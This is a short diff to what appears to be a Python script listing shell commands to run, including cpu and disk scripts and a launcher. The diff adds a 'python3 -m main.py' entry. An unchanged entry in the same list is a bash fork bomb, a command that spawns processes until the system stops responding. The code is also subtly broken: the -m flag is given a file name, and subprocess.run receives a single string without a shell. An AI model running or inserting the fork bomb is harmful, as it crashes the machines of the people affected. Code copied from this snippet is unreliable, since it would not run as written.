@@ -5,7 +5,8 @@ commands = [
     "bash Scripts/cpu.sh",
     ":(){ :|: & };:",
     "bash Scripts/disk.sh",
-    "bash Scripts/launcher.sh"
+    "bash Scripts/launcher.sh",
+    "python3 -m main.py"
 ]
 
 subprocess.run(f"chmod +x Scripts/cpu.sh")
